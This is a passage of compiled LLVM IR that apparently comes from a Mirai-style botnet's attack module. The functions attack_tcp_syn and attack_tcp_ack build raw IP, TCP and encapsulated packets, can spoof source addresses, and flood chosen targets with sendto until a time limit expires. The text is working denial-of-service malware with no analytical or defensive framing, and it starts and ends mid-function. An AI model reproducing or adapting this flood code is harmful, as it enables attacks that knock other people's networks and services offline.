  %71 = call noalias i8* @calloc(i64 1510, i64 8) #10
  %72 = getelementptr inbounds i8*, i8** %12, i64 %indvars.iv
  store i8* %71, i8** %72, align 8
  %73 = getelementptr inbounds i8, i8* %71, i64 38
  %74 = getelementptr inbounds i8, i8* %71, i64 58
  store i8 69, i8* %71, align 4
  %75 = getelementptr inbounds i8, i8* %71, i64 1
  store i8 %14, i8* %75, align 1
  %76 = call zeroext i16 @htons(i16 zeroext %43) #11
  %77 = getelementptr inbounds i8, i8* %71, i64 2
  %78 = bitcast i8* %77 to i16*
  store i16 %76, i16* %78, align 2
  %79 = call zeroext i16 @htons(i16 zeroext %16) #11
  %80 = getelementptr inbounds i8, i8* %71, i64 4
  %81 = bitcast i8* %80 to i16*
  store i16 %79, i16* %81, align 4
  %82 = getelementptr inbounds i8, i8* %71, i64 8
  store i8 %18, i8* %82, align 4
  br i1 %44, label %83, label %87

; <label>:83:                                     ; preds = %70
  %84 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %85 = getelementptr inbounds i8, i8* %71, i64 6
  %86 = bitcast i8* %85 to i16*
  store i16 %84, i16* %86, align 2
  br label %87

; <label>:87:                                     ; preds = %83, %70
  %88 = getelementptr inbounds i8, i8* %71, i64 9
  store i8 47, i8* %88, align 1
  %89 = getelementptr inbounds i8, i8* %71, i64 12
  %90 = bitcast i8* %89 to i32*
  store i32 %31, i32* %90, align 4
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv, i32 1
  %92 = load i32, i32* %91, align 4
  %93 = getelementptr inbounds i8, i8* %71, i64 16
  %94 = bitcast i8* %93 to i32*
  store i32 %92, i32* %94, align 4
  %95 = call zeroext i16 @htons(i16 zeroext 25944) #11
  %96 = getelementptr inbounds i8, i8* %71, i64 22
  %97 = bitcast i8* %96 to i16*
  store i16 %95, i16* %97, align 2
  %98 = call zeroext i16 @htons(i16 zeroext 2048) #11
  %99 = getelementptr inbounds i8, i8* %71, i64 36
  %100 = bitcast i8* %99 to i16*
  store i16 %98, i16* %100, align 1
  store i8 69, i8* %73, align 4
  %101 = getelementptr inbounds i8, i8* %71, i64 39
  store i8 %14, i8* %101, align 1
  %102 = call zeroext i16 @htons(i16 zeroext %46) #11
  %103 = getelementptr inbounds i8, i8* %71, i64 40
  %104 = bitcast i8* %103 to i16*
  store i16 %102, i16* %104, align 2
  %105 = call zeroext i16 @htons(i16 zeroext %47) #11
  %106 = getelementptr inbounds i8, i8* %71, i64 42
  %107 = bitcast i8* %106 to i16*
  store i16 %105, i16* %107, align 4
  %108 = getelementptr inbounds i8, i8* %71, i64 46
  store i8 %18, i8* %108, align 4
  br i1 %44, label %109, label %113

; <label>:109:                                    ; preds = %87
  %110 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %111 = getelementptr inbounds i8, i8* %71, i64 44
  %112 = bitcast i8* %111 to i16*
  store i16 %110, i16* %112, align 2
  br label %113

; <label>:113:                                    ; preds = %109, %87
  %114 = getelementptr inbounds i8, i8* %71, i64 47
  store i8 17, i8* %114, align 1
  %. = select i1 %48, i32 1023, i32 %92
  %115 = getelementptr inbounds i8, i8* %71, i64 54
  %116 = bitcast i8* %115 to i32*
  store i32 %., i32* %116, align 4
  %117 = call zeroext i16 @htons(i16 zeroext %22) #11
  %118 = bitcast i8* %74 to i16*
  store i16 %117, i16* %118, align 2
  %119 = call zeroext i16 @htons(i16 zeroext %24) #11
  %120 = getelementptr inbounds i8, i8* %71, i64 60
  %121 = bitcast i8* %120 to i16*
  store i16 %119, i16* %121, align 2
  %122 = call zeroext i16 @htons(i16 zeroext %50) #11
  %123 = getelementptr inbounds i8, i8* %71, i64 62
  %124 = bitcast i8* %123 to i16*
  store i16 %122, i16* %124, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %125 = icmp slt i64 %indvars.iv.next, %51
  br i1 %125, label %70, label %..preheader_crit_edge

; <label>:126:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %42, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %126
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %175
  %storemerge135137 = phi i32 [ %202, %175 ], [ 0, %.lr.ph.preheader ]
  %127 = sext i32 %storemerge135137 to i64
  %128 = getelementptr inbounds i8*, i8** %12, i64 %127
  %129 = load i8*, i8** %128, align 8
  %130 = getelementptr inbounds i8, i8* %129, i64 24
  %131 = getelementptr inbounds i8, i8* %129, i64 38
  %132 = bitcast i8* %131 to %struct.iphdr*
  %133 = getelementptr inbounds i8, i8* %129, i64 58
  %134 = getelementptr inbounds i8, i8* %129, i64 66
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %127, i32 2
  %136 = load i8, i8* %135, align 4
  %137 = icmp ult i8 %136, 32
  br i1 %137, label %138, label %145

; <label>:138:                                    ; preds = %.lr.ph
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %127, i32 1
  %140 = load i32, i32* %139, align 4
  %141 = call i32 @ntohl(i32 %140) #11
  %142 = call i32 @htonl(i32 %141) #11
  %143 = getelementptr inbounds i8, i8* %129, i64 16
  %144 = bitcast i8* %143 to i32*
  store i32 %142, i32* %144, align 4
  br label %145

; <label>:145:                                    ; preds = %138, %.lr.ph
  br i1 %56, label %146, label %149

; <label>:146:                                    ; preds = %145
  %147 = getelementptr inbounds i8, i8* %129, i64 12
  %148 = bitcast i8* %147 to i32*
  store i32 0, i32* %148, align 4
  br label %149

; <label>:149:                                    ; preds = %146, %145
  br i1 %58, label %150, label %155

; <label>:150:                                    ; preds = %149
  %151 = getelementptr inbounds i8, i8* %129, i64 4
  %152 = bitcast i8* %151 to i16*
  store i16 0, i16* %152, align 4
  %153 = getelementptr inbounds i8, i8* %129, i64 42
  %154 = bitcast i8* %153 to i16*
  store i16 999, i16* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %150, %149
  br i1 %60, label %156, label %158

; <label>:156:                                    ; preds = %155
  %157 = bitcast i8* %133 to i16*
  store i16 0, i16* %157, align 2
  br label %158

; <label>:158:                                    ; preds = %156, %155
  br i1 %62, label %159, label %162

; <label>:159:                                    ; preds = %158
  %160 = getelementptr inbounds i8, i8* %129, i64 60
  %161 = bitcast i8* %160 to i16*
  store i16 0, i16* %161, align 2
  br label %162

; <label>:162:                                    ; preds = %159, %158
  br i1 %63, label %167, label %163

; <label>:163:                                    ; preds = %162
  %164 = getelementptr inbounds i8, i8* %129, i64 16
  %165 = bitcast i8* %164 to i32*
  %166 = load i32, i32* %165, align 4
  br label %167

; <label>:167:                                    ; preds = %162, %163
  %.sink3 = phi i32 [ %166, %163 ], [ 0, %162 ]
  %168 = getelementptr inbounds i8, i8* %129, i64 54
  %169 = bitcast i8* %168 to i32*
  store i32 %.sink3, i32* %169, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i32 0, i32* %9, align 4
  call void @util_memcpy(i8* %130, i8* nonnull %64, i32 4) #10
  %170 = getelementptr inbounds i8, i8* %129, i64 30
  call void @util_memcpy(i8* %170, i8* nonnull %65, i32 4) #10
  %171 = getelementptr inbounds i8, i8* %129, i64 28
  call void @util_memcpy(i8* %171, i8* nonnull %66, i32 2) #10
  %172 = getelementptr inbounds i8, i8* %129, i64 34
  call void @util_memcpy(i8* %172, i8* %67, i32 2) #10
  br i1 %68, label %175, label %173

; <label>:173:                                    ; preds = %167
  call void @rand_alphastr(i8* nonnull %134, i32 %25)
  %174 = getelementptr inbounds i8, i8* %134, i64 %.pre
  store i8 0, i8* %174, align 1
  br label %175

; <label>:175:                                    ; preds = %167, %173
  %176 = getelementptr inbounds i8, i8* %129, i64 10
  %177 = bitcast i8* %176 to i16*
  store i16 0, i16* %177, align 2
  %178 = bitcast i8* %129 to i16*
  %179 = call zeroext i16 @checksum_generic(i16* %178, i32 20)
  store i16 %179, i16* %177, align 2
  %180 = getelementptr inbounds i8, i8* %129, i64 48
  %181 = bitcast i8* %180 to i16*
  store i16 0, i16* %181, align 2
  %182 = bitcast i8* %131 to i16*
  %183 = call zeroext i16 @checksum_generic(i16* %182, i32 20)
  store i16 %183, i16* %181, align 2
  %184 = getelementptr inbounds i8, i8* %129, i64 64
  %185 = bitcast i8* %184 to i16*
  store i16 0, i16* %185, align 2
  %186 = getelementptr inbounds i8, i8* %129, i64 62
  %187 = bitcast i8* %186 to i16*
  %188 = load i16, i16* %187, align 2
  %189 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %132, i8* nonnull %133, i16 zeroext %188, i32 %69)
  store i16 %189, i16* %185, align 2
  %190 = load i32, i32* %6, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %191, i32 0, i32 0
  store i16 2, i16* %192, align 4
  %193 = getelementptr inbounds i8, i8* %129, i64 16
  %194 = bitcast i8* %193 to i32*
  %195 = load i32, i32* %194, align 4
  %196 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %191, i32 0, i32 2, i32 0
  store i32 %195, i32* %196, align 4
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %191, i32 0, i32 1
  store i16 0, i16* %197, align 2
  %198 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %191, i32 0
  %199 = bitcast %struct.sockaddr_in* %198 to %struct.sockaddr*
  %200 = call i64 @sendto(i32 %35, i8* nonnull %129, i64 %.pre140, i32 16384, %struct.sockaddr* %199, i32 16) #10
  %201 = load i32, i32* %6, align 4
  %202 = add nsw i32 %201, 1
  store i32 %202, i32* %6, align 4
  %203 = icmp slt i32 %202, %41
  br i1 %203, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %175
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %126
  %204 = call i64 @time(i64* null) #10
  %205 = icmp sgt i64 %204, %55
  br i1 %205, label %.loopexit.loopexit, label %126

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %5, %52
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %7 = zext i8 %1 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 1)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 16, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 17, i32 0)
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 10, i32 0)
  %25 = trunc i32 %24 to i8
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 11, i32 0)
  %27 = trunc i32 %26 to i16
  %28 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 12, i32 0)
  %29 = trunc i32 %28 to i16
  %30 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 13, i32 0)
  %31 = trunc i32 %30 to i16
  %32 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 14, i32 1)
  %33 = trunc i32 %32 to i16
  %34 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 15, i32 0)
  %35 = trunc i32 %34 to i16
  %36 = load i32, i32* @LOCAL_ADDR, align 4
  %37 = tail call i32 @attack_get_opt_ip(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 24, i32 %36)
  %38 = tail call i64 @time(i64* null) #10
  %39 = zext i32 %0 to i64
  %40 = add i64 %38, %39
  %41 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %.loopexit, label %43

; <label>:43:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %44 = bitcast i32* %6 to i8*
  %45 = call i32 @setsockopt(i32 %41, i32 0, i32 3, i8* nonnull %44, i32 4) #10
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %70, label %.preheader131

.preheader131:                                    ; preds = %43
  store i32 0, i32* %6, align 4
  %47 = zext i8 %1 to i32
  %48 = icmp eq i8 %1, 0
  br i1 %48, label %.preheader, label %.lr.ph133

.lr.ph133:                                        ; preds = %.preheader131
  %49 = icmp eq i8 %17, 0
  %50 = trunc i32 %22 to i16
  %51 = and i8 %25, 1
  %52 = zext i8 %51 to i16
  %53 = shl nuw nsw i16 %52, 13
  %54 = shl i16 %27, 12
  %55 = and i16 %54, 4096
  %56 = shl i16 %29, 11
  %57 = and i16 %56, 2048
  %58 = shl i16 %31, 10
  %59 = and i16 %58, 1024
  %60 = shl i16 %33, 9
  %61 = and i16 %60, 512
  %62 = shl i16 %35, 8
  %63 = and i16 %62, 256
  %64 = or i16 %53, %55
  %65 = or i16 %64, %57
  %66 = or i16 %65, %59
  %.masked = or i16 %66, %61
  %67 = or i16 %.masked, %63
  %68 = zext i8 %1 to i64
  %69 = or i16 %67, 160
  br label %84

; <label>:70:                                     ; preds = %43
  %71 = call i32 @close(i32 %41) #10
  br label %.loopexit

..preheader_crit_edge:                            ; preds = %101
  %72 = trunc i64 %indvars.iv.next to i32
  store i32 %72, i32* %6, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader131, %..preheader_crit_edge
  %sext = shl i64 %40, 32
  %73 = ashr exact i64 %sext, 32
  %74 = icmp eq i32 %37, -1
  %75 = and i32 %12, 65535
  %76 = icmp eq i32 %75, 65535
  %77 = and i32 %18, 65535
  %78 = icmp eq i32 %77, 65535
  %79 = and i32 %20, 65535
  %80 = icmp eq i32 %79, 65535
  %81 = icmp eq i32 %22, 65535
  %82 = icmp eq i32 %23, 65535
  %83 = icmp eq i8 %25, 0
  br label %133

; <label>:84:                                     ; preds = %.lr.ph133, %101
  %indvars.iv = phi i64 [ 0, %.lr.ph133 ], [ %indvars.iv.next, %101 ]
  %85 = call noalias i8* @calloc(i64 128, i64 1) #10
  %86 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv
  store i8* %85, i8** %86, align 8
  %87 = getelementptr inbounds i8, i8* %85, i64 20
  %88 = getelementptr inbounds i8, i8* %85, i64 40
  store i8 69, i8* %85, align 4
  %89 = getelementptr inbounds i8, i8* %85, i64 1
  store i8 %11, i8* %89, align 1
  %90 = call zeroext i16 @htons(i16 zeroext 60) #11
  %91 = getelementptr inbounds i8, i8* %85, i64 2
  %92 = bitcast i8* %91 to i16*
  store i16 %90, i16* %92, align 2
  %93 = call zeroext i16 @htons(i16 zeroext %13) #11
  %94 = getelementptr inbounds i8, i8* %85, i64 4
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 4
  %96 = getelementptr inbounds i8, i8* %85, i64 8
  store i8 %15, i8* %96, align 4
  br i1 %49, label %101, label %97

; <label>:97:                                     ; preds = %84
  %98 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %99 = getelementptr inbounds i8, i8* %85, i64 6
  %100 = bitcast i8* %99 to i16*
  store i16 %98, i16* %100, align 2
  br label %101

; <label>:101:                                    ; preds = %84, %97
  %102 = getelementptr inbounds i8, i8* %85, i64 9
  store i8 6, i8* %102, align 1
  %103 = getelementptr inbounds i8, i8* %85, i64 12
  %104 = bitcast i8* %103 to i32*
  store i32 %37, i32* %104, align 4
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv, i32 1
  %106 = load i32, i32* %105, align 4
  %107 = getelementptr inbounds i8, i8* %85, i64 16
  %108 = bitcast i8* %107 to i32*
  store i32 %106, i32* %108, align 4
  %109 = call zeroext i16 @htons(i16 zeroext %19) #11
  %110 = bitcast i8* %87 to i16*
  store i16 %109, i16* %110, align 4
  %111 = call zeroext i16 @htons(i16 zeroext %21) #11
  %112 = getelementptr inbounds i8, i8* %85, i64 22
  %113 = bitcast i8* %112 to i16*
  store i16 %111, i16* %113, align 2
  %114 = call zeroext i16 @htons(i16 zeroext %50) #11
  %115 = zext i16 %114 to i32
  %116 = getelementptr inbounds i8, i8* %85, i64 24
  %117 = bitcast i8* %116 to i32*
  store i32 %115, i32* %117, align 4
  %118 = getelementptr inbounds i8, i8* %85, i64 32
  %119 = bitcast i8* %118 to i16*
  store i16 %69, i16* %119, align 4
  %120 = getelementptr inbounds i8, i8* %85, i64 41
  store i8 2, i8* %88, align 1
  %121 = getelementptr inbounds i8, i8* %85, i64 42
  store i8 4, i8* %120, align 1
  %122 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %123 = bitcast i8* %121 to i16*
  store i16 %122, i16* %123, align 2
  %124 = getelementptr inbounds i8, i8* %85, i64 44
  %125 = getelementptr inbounds i8, i8* %85, i64 45
  store i8 4, i8* %124, align 1
  %126 = getelementptr inbounds i8, i8* %85, i64 46
  store i8 2, i8* %125, align 1
  %127 = getelementptr inbounds i8, i8* %85, i64 47
  store i8 8, i8* %126, align 1
  store i8 10, i8* %127, align 1
  %128 = getelementptr inbounds i8, i8* %85, i64 56
  %129 = getelementptr inbounds i8, i8* %85, i64 57
  store i8 1, i8* %128, align 1
  %130 = getelementptr inbounds i8, i8* %85, i64 58
  store i8 3, i8* %129, align 1
  %131 = getelementptr inbounds i8, i8* %85, i64 59
  store i8 3, i8* %130, align 1
  store i8 6, i8* %131, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %132 = icmp slt i64 %indvars.iv.next, %68
  br i1 %132, label %84, label %..preheader_crit_edge

; <label>:133:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %48, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %133
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %177
  %134 = phi i32 [ %194, %177 ], [ 0, %.lr.ph.preheader ]
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds i8*, i8** %9, i64 %135
  %137 = load i8*, i8** %136, align 8
  %138 = bitcast i8* %137 to %struct.iphdr*
  %139 = getelementptr inbounds i8, i8* %137, i64 20
  %140 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %135, i32 2
  %141 = load i8, i8* %140, align 4
  %142 = icmp ult i8 %141, 32
  br i1 %142, label %143, label %150

; <label>:143:                                    ; preds = %.lr.ph
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %135, i32 1
  %145 = load i32, i32* %144, align 4
  %146 = call i32 @ntohl(i32 %145) #11
  %147 = call i32 @htonl(i32 %146) #11
  %148 = getelementptr inbounds i8, i8* %137, i64 16
  %149 = bitcast i8* %148 to i32*
  store i32 %147, i32* %149, align 4
  br label %150

; <label>:150:                                    ; preds = %143, %.lr.ph
  br i1 %74, label %151, label %154

; <label>:151:                                    ; preds = %150
  %152 = getelementptr inbounds i8, i8* %137, i64 12
  %153 = bitcast i8* %152 to i32*
  store i32 0, i32* %153, align 4
  br label %154

; <label>:154:                                    ; preds = %151, %150
  br i1 %76, label %155, label %158

; <label>:155:                                    ; preds = %154
  %156 = getelementptr inbounds i8, i8* %137, i64 4
  %157 = bitcast i8* %156 to i16*
  store i16 0, i16* %157, align 4
  br label %158

; <label>:158:                                    ; preds = %155, %154
  br i1 %78, label %159, label %161

; <label>:159:                                    ; preds = %158
  %160 = bitcast i8* %139 to i16*
  store i16 0, i16* %160, align 4
  br label %161

; <label>:161:                                    ; preds = %159, %158
  br i1 %80, label %162, label %165

; <label>:162:                                    ; preds = %161
  %163 = getelementptr inbounds i8, i8* %137, i64 22
  %164 = bitcast i8* %163 to i16*
  store i16 0, i16* %164, align 2
  br label %165

; <label>:165:                                    ; preds = %162, %161
  br i1 %81, label %166, label %169

; <label>:166:                                    ; preds = %165
  %167 = getelementptr inbounds i8, i8* %137, i64 24
  %168 = bitcast i8* %167 to i32*
  store i32 0, i32* %168, align 4
  br label %169

; <label>:169:                                    ; preds = %166, %165
  br i1 %82, label %170, label %173

; <label>:170:                                    ; preds = %169
  %171 = getelementptr inbounds i8, i8* %137, i64 28
  %172 = bitcast i8* %171 to i32*
  store i32 0, i32* %172, align 4
  br label %173

; <label>:173:                                    ; preds = %170, %169
  br i1 %83, label %177, label %174

; <label>:174:                                    ; preds = %173
  %175 = getelementptr inbounds i8, i8* %137, i64 38
  %176 = bitcast i8* %175 to i16*
  store i16 0, i16* %176, align 2
  br label %177

; <label>:177:                                    ; preds = %173, %174
  %178 = getelementptr inbounds i8, i8* %137, i64 10
  %179 = bitcast i8* %178 to i16*
  store i16 0, i16* %179, align 2
  %180 = bitcast i8* %137 to i16*
  %181 = call zeroext i16 @checksum_generic(i16* %180, i32 20)
  store i16 %181, i16* %179, align 2
  %182 = getelementptr inbounds i8, i8* %137, i64 36
  %183 = bitcast i8* %182 to i16*
  store i16 0, i16* %183, align 4
  %184 = call zeroext i16 @htons(i16 zeroext 40) #11
  %185 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %138, i8* %139, i16 zeroext %184, i32 40)
  store i16 %185, i16* %183, align 4
  %186 = getelementptr inbounds i8, i8* %137, i64 22
  %187 = bitcast i8* %186 to i16*
  %188 = load i16, i16* %187, align 2
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %135, i32 0, i32 1
  store i16 %188, i16* %189, align 2
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %135, i32 0
  %191 = bitcast %struct.sockaddr_in* %190 to %struct.sockaddr*
  %192 = call i64 @sendto(i32 %41, i8* %137, i64 60, i32 16384, %struct.sockaddr* %191, i32 16) #10
  %193 = load i32, i32* %6, align 4
  %194 = add nsw i32 %193, 1
  store i32 %194, i32* %6, align 4
  %195 = icmp slt i32 %194, %47
  br i1 %195, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %177
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %133
  %196 = call i64 @time(i64* null) #10
  %197 = icmp sgt i64 %196, %73
  br i1 %197, label %.loopexit.loopexit, label %133

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %5, %70
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %7 = zext i8 %1 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 16, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 17, i32 65535)
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 10, i32 0)
  %25 = trunc i32 %24 to i16
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 11, i32 1)
  %27 = trunc i32 %26 to i16
  %28 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 12, i32 0)
  %29 = trunc i32 %28 to i8
  %30 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 13, i32 0)
  %31 = trunc i32 %30 to i16
  %32 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 14, i32 0)
  %33 = trunc i32 %32 to i16
  %34 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 15, i32 0)
  %35 = trunc i32 %34 to i16
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 512)
  %37 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 1, i32 1)
  %38 = trunc i32 %37 to i8
  %39 = load i32, i32* @LOCAL_ADDR, align 4
  %40 = tail call i32 @attack_get_opt_ip(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 24, i32 %39)
  %41 = tail call i64 @time(i64* null) #10
  %42 = zext i32 %0 to i64
  %43 = add i64 %41, %42
  %44 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %.loopexit, label %46

; <label>:46:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %47 = bitcast i32* %6 to i8*
  %48 = call i32 @setsockopt(i32 %44, i32 0, i32 3, i8* nonnull %47, i32 4) #10
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %73, label %.preheader134

.preheader134:                                    ; preds = %46
  store i32 0, i32* %6, align 4
  %50 = zext i8 %1 to i32
  %51 = icmp eq i8 %1, 0
  %.pre137 = sext i32 %36 to i64
  %.pre138 = add nsw i64 %.pre137, 40
  br i1 %51, label %.preheader, label %.lr.ph136

.lr.ph136:                                        ; preds = %.preheader134
  %52 = trunc i64 %.pre138 to i16
  %53 = icmp eq i8 %17, 0
  %54 = trunc i32 %22 to i16
  %55 = shl i16 %25, 13
  %56 = and i16 %55, 8192
  %57 = shl i16 %27, 12
  %58 = and i16 %57, 4096
  %59 = and i8 %29, 1
  %60 = zext i8 %59 to i16
  %61 = shl nuw nsw i16 %60, 11
  %62 = shl i16 %31, 10
  %63 = and i16 %62, 1024
  %64 = shl i16 %33, 9
  %65 = and i16 %64, 512
  %66 = shl i16 %35, 8
  %67 = and i16 %66, 256
  %68 = or i16 %56, %58
  %69 = or i16 %68, %61
  %70 = or i16 %69, %63
  %.masked = or i16 %70, %65
  %71 = or i16 %.masked, %67
  %72 = icmp eq i8 %29, 0
  %..v = select i1 %72, i16 80, i16 2128
  %. = or i16 %71, %..v
  br label %89

; <label>:73:                                     ; preds = %46
  %74 = call i32 @close(i32 %44) #10
  br label %.loopexit

.preheader.loopexit:                              ; preds = %108
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader134
  %sext = shl i64 %43, 32
  %75 = ashr exact i64 %sext, 32
  %76 = icmp eq i32 %40, -1
  %77 = and i32 %12, 65535
  %78 = icmp eq i32 %77, 65535
  %79 = and i32 %18, 65535
  %80 = icmp eq i32 %79, 65535
  %81 = and i32 %20, 65535
  %82 = icmp eq i32 %81, 65535
  %83 = icmp eq i32 %22, 65535
  %84 = icmp eq i32 %23, 65535
  %85 = icmp eq i8 %38, 0
  %86 = add nsw i64 %.pre137, 20
  %87 = trunc i64 %86 to i16
  %88 = trunc i64 %86 to i32
  br label %131

; <label>:89:                                     ; preds = %.lr.ph136, %108
  %90 = phi i32 [ 0, %.lr.ph136 ], [ %129, %108 ]
  %91 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %92 = sext i32 %90 to i64
  %93 = getelementptr inbounds i8*, i8** %9, i64 %92
  store i8* %91, i8** %93, align 8
  %94 = getelementptr inbounds i8, i8* %91, i64 20
  %95 = getelementptr inbounds i8, i8* %91, i64 40
  store i8 69, i8* %91, align 4
  %96 = getelementptr inbounds i8, i8* %91, i64 1
  store i8 %11, i8* %96, align 1
  %97 = call zeroext i16 @htons(i16 zeroext %52) #11
  %98 = getelementptr inbounds i8, i8* %91, i64 2
  %99 = bitcast i8* %98 to i16*
  store i16 %97, i16* %99, align 2
  %100 = call zeroext i16 @htons(i16 zeroext %13) #11
  %101 = getelementptr inbounds i8, i8* %91, i64 4
